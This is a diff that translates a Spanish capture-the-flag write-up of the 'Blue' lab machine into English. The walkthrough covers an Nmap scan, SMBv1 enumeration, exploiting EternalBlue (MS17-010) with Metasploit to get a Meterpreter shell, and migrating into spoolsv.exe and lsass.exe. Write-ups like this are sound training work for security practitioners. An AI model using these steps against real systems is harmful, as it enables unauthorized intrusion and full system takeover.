@@ -1,6 +1,6 @@
 ﻿# Writeup: Blue
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First, we carried out an Nmap scan of the victim machine's TCP ports:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blue]
@@ -26,7 +26,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 73.54 seconds
 ```
 
->Vemos al hacer enumeración básica con netexec que **SMBv1** está en **True** y es un **Windows 7** lo que llama a gritos una vulnerabilidad de **Eternal Blue**:
+>When we carry out a basic scan using NetExec, we can see that **SMBv1** is set to **True** and that it is a **Windows 7** system, which is a clear indication of an **Eternal Blue** vulnerability:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blue]
@@ -34,7 +34,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.54 seconds
 SMB         10.129.42.79    445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True) (Null Auth:True)
 ```
 
->Usamos el módulo de metasploit para explotar el **EternalBlue** o también conocido como **MS17-010** para ganar una shell de **meterpreter**:
+>We used the Metasploit module to exploit **EternalBlue**, also known as **MS17-010**, to gain a **Meterpreter** shell:
 
 ```bash
 msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.71
@@ -83,7 +83,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
->Aunque veamos que ya somos **NT AUTHORITY\SYSTEM**, deberíamos migrar a un proceso privilegiado ya que el nuestro puede ser que no tenga todos los tokens disponibles:
+>Although we can see that we are already **NT AUTHORITY\SYSTEM**, we should switch to a privileged process as ours may not have all the tokens available:
 
 ```bash
 C:\Windows\system32>whoami /priv
@@ -101,7 +101,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 ```
 
->Vamos a listar los procesos activos y nos quedamos con el PID del **spooler service** ya que es un servicio que corre en nombre del usuario **NT AUTHORITY\SYSTEM**:
+>Let's list the active processes and note down the PID of the * *spooler service**, as this is a service running on behalf of the user **NT AUTHORITY\SYSTEM**:
 
 ```bash
 meterpreter > ps
@@ -115,14 +115,14 @@ Process List
 <SNIP>
 ```
 
->Migramos al proceso del **spoolsv.exe** pero como vemos, el exploit ya automáticamente migró a este proceso para tener más privilegios así que ya tendríamos una shell como el usuario más privilegiado del sistema:
+>We switched to the **spoolsv.exe** process, but as we can see, the exploit had already automatically switched to this process to gain higher privileges, so we now have a shell as the most privileged user on the system:
 
 ```bash
 meterpreter > migrate 1036
 [-] Process already running at PID 1036
 ```
 
->Pero no nos vamos a quedar con esto, vamos a migrar al proceso **lsass.exe** y vamos a comprobar que ahora tenemos más tokens de privilegio que antes cuando estábamos en el **spoolsv.exe**, completando la escalada de privilegios:
+>But we're not going to stop there; we're going to switch to the **lsass.exe** process and check that we now have more privilege tokens than before, when we were in **spoolsv.exe**, thereby completing the privilege escalation:
 
 ```bash
 meterpreter > migrate 492
